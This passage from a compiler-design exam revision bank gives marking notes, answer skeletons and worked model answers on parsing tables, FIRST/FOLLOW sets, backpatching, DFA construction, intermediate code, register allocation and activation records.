FOLLOW(T)=FOLLOW(T')={+, ), $}; FOLLOW(F)={*, +, ), $}.\nM[E,id]=M[E,(]=E→TE'; M[E',+]=E'→+TE', M[E',)]=M[E',$]=E'→ε; M[T,id]=M[T,(]=T→FT'; M[T',*]=T'→*FT', M[T',+]=M[T',)]=M[T',$]=T'→ε; M[F,id]=F→id, M[F,(]=F→(E). One entry per cell, so it is LL(1).\nParse: E ⇒ TE' ⇒ FTE' ⇒ idTE' ⇒ idE' ⇒ id+TE' ⇒ id+FTE' ⇒ id+idT'E' ⇒ id+id*FT'E' ⇒ id+id*idE' ⇒ id+id*id."},"cdc-26":{"u":7,"logic":"Tests one-pass code generation for forward jumps: emit with holes, keep lists, fill later. Students write three-address code with labels but cannot show a list being patched, which is the actual ask.","how":"Define the three functions, then label the while/if-else and finish with one patched quadruple list.","skel":["Jump targets unknown in one pass","makelist, merge, backpatch","Label the while and inner if-else","Body gets 102, else gets 107, exit 110","Show the ten quadruples"],"ans":"Backpatching: generating code in a single pass while jump targets are still unknown. A jump is emitted with an empty target field and its instruction number is collected in a list (truelist or falselist); when the target label becomes known, the list is patched. Functions: makelist(i) creates a list containing i; merge(p1,p2) concatenates two lists; backpatch(p,L) writes label L into the target field of every instruction in p. Used for boolean expressions, if and while.\nwhile (a<b) { if (c<d) x=y+z; else x=y-z; }\n100: if a<b goto 102\n101: goto 110\n102: if c<d goto 104\n103: goto 107\n104: t1 = y + z\n105: x = t1\n106: goto 100\n107: t2 = y - z\n108: x = t2\n109: goto 100\n110: next statement\nBackpatching: after a<b, truelist = {100} and falselist = {101}; backpatch({100},102) when the body begins. After c<d, backpatch({103},107) sends the false case to the else part, and the else part's exit is merged with the then part's to fall to 106/109. When the loop ends, backpatch({101},110). Quadruples: (j<,a,b,102), (j,-,-,110), (j<,c,d,104), (j,-,-,107), (+,y,z,t1), (=,t1,-,x), (j,-,-,100), (-,y,z,t2), (=,t2,-,x), (j,-,-,100)."},"cdc-27":{"u":2,"logic":"The full three-stage construction on the same language as cdc-1, so it tests Thompson fragments, subset construction and minimisation in sequence. It repeats cdc-1's DFA — a sure shot if both appear.","how":"Draw the four fragments with epsilon edges, list the state sets, then give the 4-state table and prove minimality by splitting.","skel":["Thompson: a, b, choice, star, concat","Number states 0 to 15, start 6, final 15","Subset construction gives four sets","DFA: A,B,C,D with C final","Minimal: all four distinguishable"],"ans":"Thompson's construction builds an ε-NFA bottom-up; every fragment has one start and one final state.\na: 1 –a→ 2;  b: 3 –b→ 4\n(a|b): 0 –ε→ 1, 0 –ε→ 3, 2 –ε→ 5, 4 –ε→ 5\nstar: new states 6, 7 — 6 –ε→ 0, 6 –ε→ 7, 5 –ε→ 0, 5 –ε→ 7\nthen a: 8 –a→ 9, with 7 –ε→ 8\nthen (a|b): 10 –ε→ 11, 10 –ε→ 13, 11 –a→ 12, 13 –b→ 14, 12 –ε→ 15, 14 –ε→ 15, with 9 –ε→ 10.\nStart state 6, final state 15.\nSubset construction: take ε-closure of the start set, then for each symbol move and close again. The sets collapse to four distinct states:\nA (start) a→B, b→B\nB (one symbol read) a→C, b→D\nC (last symbol a) a→C, b→D — final\nD (last symbol b) a→C, b→D\nMinimisation: split into non-final {A,B,D} and final {C}. A goes to B on a while B goes to C (final), so A and B separate; B and D differ on b (C vs D). All states are distinguishable, so the four-state DFA is already minimal. It accepts exactly the strings whose penultimate symbol is a."},"cdc-28":{"u":2,"logic":"Tests whether you can turn a grammar into procedures and then execute them on paper. Students write the code but cannot trace which call consumes which character.","how":"One procedure per non-terminal, then a four-line trace naming the call that consumes each character.","skel":["One procedure per non-terminal","S: a then S, or b then A","A: b then A, or c","Trace a a b c: S, S, S, A","Accept when input ends"],"ans":"Recursive descent parsing: a top-down parser with one procedure per non-terminal. Each procedure recognises the strings of its non-terminal by matching terminals and calling other procedures. The grammar must be free of left recursion and have disjoint FIRST sets for the alternatives (LL(1)); otherwise the parser must backtrack.\nGrammar: S → aS | bA,  A → bA | c\nvoid S() {\n  if (look == 'a') { match('a'); S(); }\n  else if (look == 'b') { match('b'); A(); }\n  else error();\n}\nvoid A() {\n  if (look == 'b') { match('b'); A(); }\n  else if (look == 'c') { match('c'); }\n  else error();\n}\nmatch(t) advances the input pointer when look == t, otherwise reports an error.\nTrace for aabc: S sees a → match a, call S; S sees a → match a, call S; S sees b → match b, call A; A sees c → match c and returns. Input is exhausted and every call has returned, so aabc is accepted."},"cdc-29":{"u":2,"logic":"Tests partition refinement with a subtlety: two final states with identical behaviour must merge, so the answer is five states, not six. Students stop after the first split.","how":"P0 by final/non-final, then refine on 0 and then on 1. Show each split with the transition that caused it.","skel":["P0: {A,B,C,E} and {D,F}","D and F behave alike, keep merged","Split on 0: {A,C} and {B,E}","Split on 1: A vs C, B vs E","Five states, D and F merged"],"ans":"Start state A, final states {D, F}.\nStep 1: P0 = {A, B, C, E} (non-final) and {D, F} (final).\nStep 2: refine {D, F}: D on 0 goes to D and F on 0 goes to F, both inside the same class; on 1 the same holds. They are equivalent, so {D, F} stays as one class.\nStep 3: refine {A, B, C, E} on input 0: A→B and C→E (both to non-final), while B→D and E→F (both to the final class). Split into {A, C} and {B, E}.\nStep 4: {A, C} on input 1: A→C (non-final) but C→D (final) → split A and C.\nStep 5: {B, E} on input 1: B→E (non-final) but E→F (final) → split B and E.\nFinal partition: {A}, {B}, {C}, {E}, {D, F}. The minimal DFA has five states, with D and F merged as D':\nA: 0→B, 1→C; B: 0→D', 1→E; C: 0→E, 1→D'; E: 0→D', 1→D'; D': 0→D', 1→D'. Start A, final {D'}. Draw the five states and show the partition table."},"cdc-30":{"u":2,"logic":"Tests nullable propagation through FIRST and FOLLOW on a grammar where three non-terminals can vanish, then the LL(1) verdict. The conflict at M[B,g] is caused by B being nullable.","how":"Mark nullable symbols first, then FIRST, then FOLLOW, then read the table for double entries. Two conflicts, not one.","skel":["B and C are nullable","FIRST(S) = {a,b,d,g,h,eps}","FOLLOW(B) includes a, h, g, $","M[B,g] has two entries","Not LL(1): also M[S,h]"],"ans":"Grammar: S → ACB | CbB | Ba,  A → da | BC,  B → g | ε,  C → h | ε. B and C are nullable.\nFIRST: FIRST(B) = {g, ε}; FIRST(C) = {h, ε}; FIRST(A) = {d} ∪ FIRST(BC) = {d, g, h, ε}; FIRST(S) = {d, g, h} (from ACB, A nullable adds h, then g) ∪ {h, b} (from CbB) ∪ {g, a} (from Ba) = {a, b, d, g, h, ε}.\nFOLLOW(S) = {$}. FOLLOW(A): A is followed by C, so h; C nullable adds g; B nullable adds $ → {h, g, $}. FOLLOW(C): C is followed by B, so g; B nullable adds $; CbB adds b → {g, $, b}. FOLLOW(B): B ends ACB and CbB, so $; Ba adds a; A→BC adds h and, C being nullable, FOLLOW(A) → {a, h, g, $}.\nLL(1) table entries: M[A,d]=A→da, M[A,g]=M[A,h]=M[A,$]=A→BC; M[B,g]=B→g and M[B,a]=M[B,h]=M[B,$]=B→ε; M[C,h]=C→h, M[C,g]=M[C,$]=M[C,b]=C→ε; M[S,d]=S→ACB, M[S,h]=S→ACB and S→CbB, M[S,b]=S→CbB, M[S,g]=S→ACB and S→Ba, M[S,a]=S→Ba.\nThe cells M[B,g] and M[S,h] each hold two entries, so the grammar is not LL(1)."},"cdc-31":{"u":2,"logic":"Tests the handle as the reverse of a rightmost derivation, and whether you can list handles for id+id*id in the right order. The final E+T reduction is where precedence shows up.","how":"Define handle and pruning, then a two-column pruning table: right-sentential form and handle with its production.","skel":["Handle: RHS of a production in a right-sentential form","Reducing it is one step of a rightmost derivation reversed","Handle pruning reduces input to start symbol","First handles: id, F, T","Last handles: T*F, then E+T"],"ans":"Handle: in a right-sentential form, a handle is a substring that matches the right side of some production and whose reduction is one step in the reverse of a rightmost derivation. Not every RHS occurrence is a handle — only the one that the parser must reduce next. In LR parsing the handle is always found on top of the stack.\nHandle pruning: repeatedly locate the handle in the current right-sentential form and replace it by the left side of its production. This reduces the input to the start symbol, and the sequence of handles is exactly the reverse of a rightmost derivation.\nFor E→E+T|T, T→T*F|F, F→(E)|id, the string id+id*id:\nid+id*id → handle id (F→id) ⇒ F+id*id\nF+id*id → handle F (T→F) ⇒ T+id*id\nT+id*id → handle T (E→T) ⇒ E+id*id\nE+id*id → handle id (F→id) ⇒ E+F*id\nE+F*id → handle F (T→F) ⇒ E+T*id\nE+T*id → handle id (F→id) ⇒ E+T*F\nE+T*F → handle T*F (T→T*F) ⇒ E+T\nE+T → handle E+T (E→E+T) ⇒ E, accept.\nNote that T*F is reduced before E+T: * binds tighter than +, so the handle is inside the last term first."},"cdc-32":{"u":7,"logic":"Tests whether you know IR is a representation, not just TAC text: the same TAC must yield quadruples, triples and indirect triples. The trap is inventing triples separately or forgetting triples have no result field.","how":"Emit and number the TAC first; those numbers become the triple result references. One table, three columns, no new temporaries.","skel":["Define intermediate code in one line","Four advantages of three-address code","Emit t1-t4 and a = t4","Quadruple table, five rows","Triple table plus pointer array"],"ans":"Intermediate code (IR) is a machine-independent representation of the source produced after semantic analysis; it sits between the parse tree and the target code.\nAdvantages of three-address code: (i) at most one operator per instruction, so each maps to one machine instruction; (ii) temporaries are explicit and can later be allocated to registers; (iii) it is machine-independent, so the optimiser runs once and many targets reuse it; (iv) it converts mechanically into quadruples, triples or indirect triples.\nTAC for a = b * (-c) + d / e:\nt1 = -c\nt2 = b * t1\nt3 = d / e\nt4 = t2 + t3\na = t4\nQuadruples (op, arg1, arg2, result):\n0: uminus c - t1\n1: * b t1 t2\n2: / d e t3\n3: + t2 t3 t4\n4: = t4 - a\nTriples (the result is the statement number):\n0: uminus c -\n1: * b (0)\n2: / d e -\n3: + (1) (2)\n4: = a (3)\nIndirect triples keep the same triple table but hold a separate pointer array 35, 36, 37, 38, 39 pointing at those statements, so statements can be reordered without renumbering their operands."},"cdc-33":{"u":7,"logic":"Tests backpatching as deferred patching: can you write semantic rules with truelist and falselist, then fill jump targets later? Students who emit real labels lose the point of the question.","how":"Write makelist, merge, backpatch first, then the rules for relop, and-or, not, then walk the example quad by quad naming which list is patched.","skel":["Define backpatching and three helpers","SDD for relop, and, or, not","Emit quads 100-105 with empty targets","Patch truelist to 106, falselist to 108","State the three list contents"],"ans":"Backpatching generates jumps with empty targets and fills the target once it is known. Three routines do the work: makelist(i) makes a list containing quad i; merge(p1, p2) concatenates two lists; backpatch(p, t) inserts t as the target of every quad in p.\nSDD, with M a marker non-terminal:\nM -> e { M.quad = nextquad }\nE -> id1 relop id2 { E.truelist = makelist(nextquad); emit(if id1 relop id2 goto _); E.falselist = makelist(nextquad); emit(goto _) }\nE -> E1 and M E2 { backpatch(E1.truelist, M.quad); E.truelist = E2.truelist; E.falselist = merge(E1.falselist, E2.falselist) }\nE -> E1 or M E2 { backpatch(E1.falselist, M.quad); E.truelist = merge(E1.truelist, E2.truelist); E.falselist = E2.falselist }\nE -> not E1 { E.truelist = E1.falselist; E.falselist = E1.truelist }\nE -> (E1) { E.truelist = E1.truelist; E.falselist = E1.falselist }\nFor if (a<b and c>d or e==f) x=1; else x=0;\n100: if a<b goto 102\n101: goto 104\n102: if c>d goto _\n103: goto 104\n104: if e==f goto 106\n105: goto 108\n106: x = 1\n107: goto 109\n108: x = 0\nLists: a<b gives {100} and {101}; c>d gives {102} and {103}; e==f gives {104} and {105}. The and-rule patches {100} to 102 and merges {101, 103} as the false exit; the or-rule patches {101, 103} to 104; finally truelist {102, 104} is patched to 106 and falselist {105} to 108."},"cdc-34":{"u":9,"logic":"Tests application, not recall: the marks are in the before/after block and in spotting that y and b become dead. Students who only define the four terms score half.","how":"Always run in order: constant propagation, folding, copy propagation, strength reduction, dead code. Then write the rewritten block and say what vanished.","skel":["Definition line for each technique","Write the original seven statements","Constant propagation then folding","Copy propagation: d = a","Dead y and b removed"],"ans":"Original block: x = 3; y = x; z = x + 5; a = y * 2; b = 8; c = b / 2; d = a + 0;\n• Copy propagation: y is only a copy of x, so every use of y is replaced by x (a = y * 2 becomes a = x * 2); d = a + 0 means d can use a directly.\n• Constant propagation: x = 3, so z = 3 + 5 and a = 3 * 2; b = 8, so c = 8 / 2.\n• Constant folding: evaluate constant expressions at compile time — z = 8, a = 6, c = 4.\n• Strength reduction: multiplication by a power of two becomes a shift, and addition of zero disappears: a = x * 2 could be a = x << 1, and d = a + 0 becomes d = a. Here folding is cheaper than either.\n• Dead code elimination: y is never used after propagation and b is never used after folding, so both definitions are deleted; their multiplications and the division go with them.\nOptimised block:\nx = 3\nz = 8\na = 6\nc = 4\nd = a\nSeven statements become five, one division and two multiplications disappear, and the result is identical for every input."},"cdc-35":{"u":8,"logic":"Tests the chain live range to interference graph to colouring, plus the spill decision. Most students draw the graph correctly then colour by guesswork instead of using the degree rule.","how":"Draw the graph, list degrees, then Chaitin simplify: repeatedly remove a node of degree less than K. Pop back and colour. State the spill case explicitly.","skel":["Distinguish allocation from assignment","Draw graph from the five overlaps","List degrees, K = 3","Simplify stack b, e, d, c, a","Colour R1, R2; R3 free, no spill"],"ans":"Register allocation decides which live range gets a register and which value is spilled to memory; register assignment chooses the actual register number.\nGraph colouring: one node per live range, an edge when two ranges are live at the same time, K colours for K registers; adjacent nodes must differ. Algorithm: build the graph, repeatedly remove a node of degree less than K and push it on a stack, then pop and give each node the lowest colour not used by a neighbour. A node still of degree K or more after simplification is spilled.\nInterference graph edges: a-b, b-c, c-d, d-e, b-e; a and c do not overlap, so no a-c edge. Degrees: a 1, b 3, c 2, d 2, e 2, with K = 3.\nSimplification, removing degree less than 3: remove a, then c, d, e, and finally b. Stack (bottom to top): b, e, d, c, a.\nColouring while popping:\nb = R1, e = R2 (edge b-e), d = R1 (edge d-e), c = R2 (edges to b and d), a = R2 (edge to b only).\nCheck every edge: a-b R2-R1, b-c R1-R2, c-d R2-R1, d-e R1-R2, b-e R1-R2. All differ, so the answer is R1 = {b, d}, R2 = {a, c, e}, and R3 stays free. Three registers are available and only two are needed, so no variable is spilled."},"cdc-36":{"u":2,"logic":"Two half-notes: a parser must not die at the first error, and parameter passing changes program meaning. Compact bullet answers with one example each score; long prose on one half does not.","how":"Six short bullets each: three recovery strategies with a token example, then value, reference, name with one swap example. Stop at half a page.","skel":["Panic mode: skip to synchronising token","Phrase-level: local insert or delete","Error productions and global correction","Call by value: copy, no side effect","Reference and name contrast with swap"],"ans":"(a) Error recovery in parsing — the parser must report the error and continue so later errors are also found.\n• Panic mode: discard input tokens until one in a synchronising set (a semicolon, end, or the FOLLOW set) is seen, then continue. Simple, always terminates, but may skip a large amount of valid code.\n• Phrase-level recovery: perform a local correction at the error point — insert a missing semicolon, delete an extra closing bracket, or replace an identifier by the expected token. Used by yacc-style parsers; never loops because each repair consumes input.\n• Error productions: add rules for known mistakes, e.g. L -> L , so a trailing comma parses and a clear message is produced.\n• Global correction: find the minimum-cost sequence of insert, delete and replace over the whole program (CYK-style); good messages but too slow for production use.\n(b) Parameter passing mechanisms\n• Call by value: the callee receives a copy, so assignments inside it do not affect the caller (the C default).\n• Call by reference: the address is passed, so swap(a, b) really exchanges the caller's variables.\n• Call by value-result: copy in, copy back on return.\n• Call by name: textual substitution, re-evaluated at each use; powerful but unsafe and hard to implement."},"cdc-37":{"u":2,"logic":"Tests whether you can produce a conflict example and then build an SLR table where reductions depend on FOLLOW. Typical errors are putting r on the wrong lookahead or forgetting accept only on $.","how":"Give the four-production RR example in three lines, then the nine SLR states. Every reduce entry must come from FOLLOW of the left side.","skel":["RR example with A -> c and B -> c","Show both reduces on d and e","Eight item sets I0-I8","FOLLOW(E) and FOLLOW(L)","Fill ACTION and GOTO, accept on $"],"ans":"Reduce-reduce conflict: one state contains two completed items with different left sides and a common lookahead.\nExample: S -> aAd | bBd | aBe | bAe, A -> c, B -> c. After reading a c, the state is {A -> c., B -> c.}. FOLLOW(A) = FOLLOW(B) = {d, e}, so SLR puts reduce A -> c and reduce B -> c in both the d and e columns — a reduce-reduce conflict. LR(1) separates them because the lookaheads differ by context ({A -> c., d} and {B -> c., e} after a), and LALR merges those states and conflicts again.\nSLR table for E -> (L) | a, L -> L, E | E. Augment to S' -> E.\nFOLLOW(E) = { ), comma, $ }, FOLLOW(L) = { ), comma }.\nI0: S'->.E, E->.(L), E->.a  goto E 1, ( 2, a 3\nI1: S'->E.\nI2: E->(.L), L->.L,E, L->.E, E->.(L), E->.a  goto L 4, E 5, ( 2, a 3\nI3: E->a.\nI4: E->(L.), L->L.,E  goto ) 6, comma 7\nI5: L->E.\nI6: E->(L).\nI7: L->L,.E, E->.(L), E->.a  goto E 8, ( 2, a 3\nI8: L->L,E.\nACTION and GOTO:\n0: ( s2, a s3, E 1\n1: $ accept\n2: ( s2, a s3, E 5, L 4\n3: reduce E->a on ), comma, $\n4: ) s6, comma s7\n5: reduce L->E on ), comma\n6: reduce E->(L) on ), comma, $\n7: ( s2, a s3, E 8\n8: reduce L->L,E on ), comma\nNo cell has two entries, so the grammar is SLR(1)."},"cdc-38":{"u":7,"logic":"Tests two things at once: why IR exists at all, and the DAG-versus-tree distinction (sharing). The numeric half catches students who ignore precedence or associativity.","how":"Parenthesise first: ((B + C) - (D * E)) + G. Then four temporaries, then the two tables. State DAG sharing with one repeated-subexpression example.","skel":["Four significances of intermediate code","DAG vs tree: sharing of subexpressions","Parenthesise by precedence, left to right","TAC t1 to t4, then A = t4","Quadruple and triple tables"],"ans":"Intermediate code is the machine-independent form produced after semantic analysis. Its significance:\n• Portability and retargeting: one front end feeds many back ends, and only the code generator changes for a new machine.\n• Optimisation is easier on a uniform three-address form than on a parse tree.\n• The front end can be tested and proved correct without any target machine.\n• It separates language-dependent analysis from machine-dependent synthesis, so front ends and back ends can be developed in parallel.\nDAG vs syntax tree:\n• Syntax tree: one node per occurrence, so B + C written twice creates two separate plus nodes; children keep order.\n• DAG: identical subexpressions share one node, so common subexpressions are identified and can be computed once; it also exposes dead code.\n• The tree is larger; the DAG is the compact form used inside a basic block.\nFor A = B + C - D * E + G, precedence gives ((B + C) - (D * E)) + G, left to right:\nt1 = B + C\nt2 = D * E\nt3 = t1 - t2\nt4 = t3 + G\nA = t4\nQuadruples: 0 (+, B, C, t1); 1 (*, D, E, t2); 2 (-, t1, t2, t3); 3 (+, t3, G, t4); 4 (=, t4, -, A).\nTriples: 0 (+, B, C); 1 (*, D, E); 2 (-, (0), (1)); 3 (+, (2), G); 4 (=, A, (3))."},"cdc-39":{"u":2,"logic":"Two unrelated skills in one question: deferred jump patching and position-based RE to DFA. Weak students do backpatching and lose the whole second half, or build an NFA and stop there.","how":"Do the DFA first (fast, mechanical, positions and followpos), then backpatching with a five-line if-else. The hash is the end marker, not part of the language.","skel":["Define backpatching with three helpers","Emit if-else quads 100-105","Say which list is patched when","Number positions 1 to 5","followpos 1 to 2,3 then 2,3 to 4 then 4 to 5"],"ans":"Backpatching emits jumps with empty targets and fills them in when the target is known; makelist(i) makes a list holding quad i, merge joins lists, backpatch(p, t) writes t into every quad of p.\nExample: if a < b then x = 1 else x = 0\n100: if a < b goto _    truelist = {100}\n101: goto _             falselist = {101}\n102: x = 1\n103: goto _\n104: x = 0\n105: next\nAfter the then-part, backpatch({100}, 102). After the else-part, backpatch({101}, 104), and the jump at 103 is patched to 105 so the then-branch does not fall into the else-branch. Only the target field changes and each quad is written once, so it is a one-pass technique (used for boolean expressions, if and while).\nDFA for a(a + b)a# with # the end marker. Positions: 1:a, 2:a, 3:b, 4:a, 5:#.\nnullable: none. firstpos and lastpos: 1 -> {1}; (2|3) -> {2,3}; 4 -> {4}; 5 -> {5}.\nfollowpos: 1 -> {2,3}; 2 -> {4}; 3 -> {4}; 4 -> {5}.\nstart state = firstpos(root) = {1}.\nA = {1} --a--> {2,3} = B\nB --a--> {4} = C;  B --b--> C\nC --#--> {5} = D, final\nFour states; D is the only final state, and only aaa# and aba# are accepted. Draw the four circles with A start and D double-circled."},"cdc-40":{"u":1,"logic":"Tests the analysis-synthesis pipeline and whether you know each phase's input, output and error type. The diagram is half the marks; a list of names without inputs earns very little.","how":"Draw six boxes left to right with symbol table and error handler as vertical bars, then one line per phase in the form input to output, plus its error.","skel":["Draw source to six phases to target","Mark front end and back end","One line per phase: in to out","Name each phase's error","Symbol table and error handler as bars"],"ans":"A compiler translates a source program into target code through six phases; the first three form the analysis part (front end) and the last three the synthesis part (back end).\n1. Lexical analysis — reads characters, groups them into lexemes and returns tokens such as <id, 1>, <num, 42>, <if>; strips blanks and comments; inserts identifiers into the symbol table. Error: illegal character, unterminated string.\n2. Syntax analysis — checks the token stream against the grammar and builds a parse tree. Error: syntax error, unexpected token.\n3. Semantic analysis — type checking, scope resolution and declaration checking; annotates the tree with types. Error: type mismatch, undeclared identifier.\n4. Intermediate code generation — converts the annotated tree into machine-independent three-address code.\n5. Code optimisation — rewrites the IR for speed and size: common subexpressions, constant folding, dead code, loop optimisation.\n6. Code generation — maps IR to assembly or machine code, choosing instructions, registers and addressing modes.\nTwo structures run beside all six phases: the symbol table (every phase inserts or looks up) and the error handler (every phase reports into it).\nDiagram: six boxes in a row, arrows left to right, a tall symbol-table box on the left and an error-handler box on the right, each with arrows to all six phases."},"cdc-41":{"u":5,"logic":"Two storage topics in five marks: what the table holds and what a frame holds. The usual slip is confusing the static link with the control link or listing only three frame fields.","how":"Two labelled lists: eight table fields including scope and offset, then the frame drawn top to bottom with the two links arrowed. Half a page total.","skel":["Name, kind, type, scope, offset","Function: parameters and return type","Operations insert, lookup, delete","Draw frame: parameters to temporaries","Control link vs access link"],"ans":"A symbol table stores one record per identifier with these fields:\n• name (the lexeme) and the key used by the hash function\n• kind: variable, function, procedure, constant, label, type name\n• type: int, real, array(10, int), pointer(int), function with its return type\n• scope or block level, and the offset of the variable inside its activation record\n• storage class (static, extern, register, automatic) and size in bytes\n• for a function: number, types and order of parameters, and return type\n• for an array: dimensions and bounds; for a constant: its value\n• line of declaration, for error messages\nOperations: insert on declaration, lookup on every use, update, and delete or undo when a scope is exited.\nActivation record (frame): the storage for one execution of a procedure, pushed at call and popped at return. From the caller's side upwards: actual parameters, return value, control link (dynamic link to the caller's frame), access link (static link to the lexically enclosing frame), saved machine status (return address, old FP, registers), local data, temporaries.\nThe control link restores the previous frame pointer; the access link is how a nested procedure reaches a non-local variable. Recursion pushes a fresh frame per call, which is why a stack, not static memory, is used."},"cdc-42":{"u":2,"logic":"A pure FIRST/FOLLOW drill on a nested list grammar. It tests epsilon handling, the $ in FOLLOW of the start symbol, and the rule that a trailing non-terminal inherits FOLLOW.","how":"FIRST bottom-up over the two productions, FOLLOW top-down from $ through the closing bracket and the comma. Treat it as the standard list grammar S -> (L) | a.","skel":["FIRST(S) = { (, a }","FIRST(L) from L -> L, S and L -> S","FOLLOW(S): $, ) and FOLLOW(L)","FOLLOW(L): ) and comma","Final table for S and L"],"ans":"Grammar: S -> (L) | a,  L -> L, S | S.\nFIRST sets:\nFIRST(S) = { (, a }, directly from S -> (L) and S -> a.\nFIRST(L) = { (, a }: L -> L, S begins with L itself, and L -> S begins with FIRST(S).\nFOLLOW sets:\nFOLLOW(S) = { ), comma, $ }. $ because S is the start symbol. ) because S appears as the body of S -> (L) and the string ends there. comma and ) because L -> L, S puts S at the end, so FOLLOW(S) contains all of FOLLOW(L).\nFOLLOW(L) = { ), comma }. ) from S -> ( L ). comma from L -> L , S, where L is immediately followed by a comma.\nSummary:\nS: FIRST { (, a }, FOLLOW { ), comma, $ }\nL: FIRST { (, a }, FOLLOW { ), comma }\nUse: in a table, S -> (L) is chosen on ( and S -> a on a, so the two productions of S are separable. L is left-recursive, so L -> L, S | S must be rewritten as L -> S L', L' -> , S L' | e before any LL(1) table can be built."},"cdc-43":{"u":8,"logic":"Tests the simple code generator: getReg, register and address descriptors, and the rule that you never emit a load of a value already in a register. Students write assembly without stating the algorithm.","how":"Write the five numbered steps, then trace a = b + c updating both descriptors after each instruction. The descriptors are the marks.","skel":["L = getReg(a = b op c)","If b not in L, emit LD L, b","Emit OP L, c, register if possible","Update address and register descriptors","Store at block end or when spilled"],"ans":"The simple code generator walks the IR instruction by instruction, keeping two descriptors: a register descriptor (which values each register currently holds) and an address descriptor (where each name currently lives, register or memory).\nAlgorithm for a = b op c:\n1. L = getReg(a = b op c). Prefer a register already holding a (if a is dead after this and not shared), else a register holding b, else any empty register; if every register is busy, spill the one whose next use is farthest away.\n2. If the address descriptor of b does not already say in L, emit LD L, b' where b' is b's register or memory location. If b is already in L, skip this load.\n3. Emit OP L, c', taking c from a register when it is there; if the operator is commutative and c is in a register while b is in memory, emit OP L, b' with the operands swapped to save a load.\n4. Update the address descriptor of a to in L, delete a from every other register descriptor (those registers are now free), and add a to the descriptor of L.\n5. Keep a in L if it is used later; otherwise, at the end of the basic block or when L is needed, emit ST a, L.\nTrace a = b + c with b in R0, c in memory, R1 free: getReg returns R1; LD R1, c (b already in R0, so step 3 uses it); ADD R1, R0, R1; address descriptor a = R1; ST a, R1 at the block end."},"cdc-44":{"u":2,"logic":"Tests core versus kernel items and, more importantly, lookahead propagation: the lookahead on A -> . is FIRST of whatever follows A, which students usually set to $ for every item.","how":"Kernel first (S' -> .S with $), then closure using FIRST of the following string. Number states as you goto. Write the lookahead inside every item.","skel":["Define core item, ignore lookaheads","I0 closure with lookaheads a and b","goto on S, A, a, b gives I1 to I4","From I2 get I5, I6, I7","I8 and I9 share a core, LALR merges"],"ans":"Core (kernel) item: the set of items of an LR state with the lookaheads deleted, i.e. the underlying LR(0) items. Items added by the closure operation are non-core. Two LR(1) states with the same core but different lookaheads are merged in LALR(1), which is why the core is the identity of a state.\nLR(1) item sets for S -> AA, A -> aA | b, augmented S' -> S:\nI0: [S'->.S, $], [S->.AA, $], [A->.aA, a], [A->.aA, b], [A->.b, a], [A->.b, b]\nThe first A is followed by A$, and FIRST(A$) = {a, b}; the second A is followed by $.\nI1 = goto(I0, S): [S'->S., $]\nI2 = goto(I0, A): [S->A.A, $], [A->.aA, $], [A->.b, $]\nI3 = goto(I0, a): [A->a.A, a], [A->a.A, b], [A->.aA, a], [A->.aA, b], [A->.b, a], [A->.b, b]\nI4 = goto(I0, b): [A->b., a], [A->b., b]\nI5 = goto(I2, A): [S->AA., $]\nI6 = goto(I2, a): [A->a.A, $], [A->.aA, $], [A->.b, $]\nI7 = goto(I2, b): [A->b., $]\nI8 = goto(I3, A): [A->aA., a], [A->aA., b]\nI9 = goto(I6, A): [A->aA., $]\ngoto(I3, a) = I3, goto(I3, b) = I4, goto(I6, a) = I6, goto(I6, b) = I7.\nI8 and I9 have the same core {A -> aA.} and different lookaheads, so LALR(1) merges them into one state; the merged state still reduces on a, b and $ without conflict."},"cdc-45":{"u":6,"logic":"Tests that an activation record is per call, so recursion appears as a chain of identical nodes and simply pushes another frame. The TAC half checks basic temporary generation.","how":"Draw f(3) to f(2) to f(1) as four nodes, list the frames on the stack, then give the three-line TAC. Say plainly that depth equals recursion depth.","skel":["Define activation tree, nodes are calls","Draw main, f(3), f(2), f(1)","Stack of frames with n = 3, 2, 1","TAC: temps then assignment","Recursion never appears inside TAC"],"ans":"An activation tree is the tree of procedure activations during one run: the root is the activation of main, each node is one activation of a procedure, and the children of a node are the calls it makes, ordered left to right in time. A recursion therefore appears as a chain of nodes with the same label, and the depth of that chain equals the recursion depth.\nFor int f(int n) { if (n<=1) return 1; return n * f(n-1); } called as f(3):\nmain -> f(3) -> f(2) -> f(1)\nAt the moment f(1) is executing, the stack holds four frames from bottom to top: main, f(3) with n = 3, f(2) with n = 2, f(1) with n = 1 (the top frame, no further call). Each return destroys only one frame, so the tree unwinds in reverse order of creation, and f(1) returns 1, f(2) returns 2*1, f(3) returns 3*2.\nThree-address code for a = b * c + d:\nt1 = b * c\nt2 = t1 + d\na = t2\nEvery name in TAC holds one value and instructions are flat, so recursion does not appear inside it; a recursive call becomes param n-1; call f, 1; t3 = return value."},"cdc-46":{"u":9,"logic":"A breadth question: can you classify optimisations (local, global, machine-dependent) instead of listing ten randomly? One concrete example per class is what earns the marks.","how":"Group in threes: local, loop, machine-dependent. One example each. End with the correctness criterion, which most answers forget.","skel":["Define optimisation and correctness rule","Local: CSE, folding, dead code","Loop: invariant motion, strength reduction","Machine-dependent: registers, peephole","Say the scope of each: block, loop, procedure"],"ans":"Optimisation techniques are grouped by the region they work on.\nLocal, within a basic block (machine-independent):\n• Common subexpression elimination — t1 = b * c is reused instead of recomputed in t2 = b * c.\n• Constant folding and constant propagation — x = 2 * 3 becomes x = 6; a known value is substituted into later statements.\n• Dead code elimination — a definition whose value is never used is deleted.\n• Copy propagation — x = y followed by z = x + 1 becomes z = y + 1.\n• Algebraic simplification and strength reduction — x * 1 becomes x; x * 8 becomes x << 3.\nGlobal, over the whole procedure or loop (data-flow analysis):\n• Loop-invariant code motion — an expression whose operands do not change is moved before the loop.\n• Induction variable elimination and strength reduction inside loops.\n• Loop unrolling, loop jamming (fusion), partial redundancy elimination and global value numbering.\nMachine-dependent, on the target code:\n• Register allocation and assignment by graph colouring, with spilling.\n• Instruction selection and scheduling, better addressing modes, peephole optimisation (removing MOV R0, R0, jump-to-jump and redundant load/store).\nEvery technique must preserve the observable behaviour of the program, otherwise it is a bug, not an optimisation."},"cdc-47":{"u":3,"logic":"Tests attribute flow direction, the most examined SDD idea. The common failure is giving a synthesized example for inherited attributes, which loses the whole mark for that half.","how":"Two half-pages with arrows drawn: child to parent for synthesized, parent or left sibling to child for inherited. Name S-attributed and L-attributed in one line each.","skel":["SDD and attribute definitions","Synthesized: E -> E1 + T, values from children","Inherited: D -> T L, L.in = T.type","Draw the two trees with arrows","S-attributed vs L-attributed one line"],"ans":"A syntax-directed definition attaches semantic rules to productions, and an attribute is a value attached to a grammar symbol. The direction in which the value travels decides its kind.\nSynthesized attribute — computed from the attribute values of the children of that node in the parse tree, 